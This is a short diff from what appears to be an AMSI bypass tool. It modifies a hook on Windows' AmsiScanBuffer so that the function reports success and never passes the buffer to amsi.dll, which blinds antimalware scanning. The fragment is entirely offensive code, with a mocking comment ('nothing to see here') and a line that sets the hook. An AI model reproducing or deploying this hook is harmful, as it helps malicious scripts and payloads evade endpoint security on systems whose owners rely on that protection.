@@ -11,7 +11,8 @@ HRESULT (WINAPI* pOriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext, PVOID buffer
 HRESULT HookedAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result) {
 
 	// everything is alright, nothing to see here
-	return AMSI_RESULT_CLEAN;
+	// we don't send the buffer to amsi.dll
+	return 0x0;
 }
 
 // Set hooks on AmsiScanBuffer
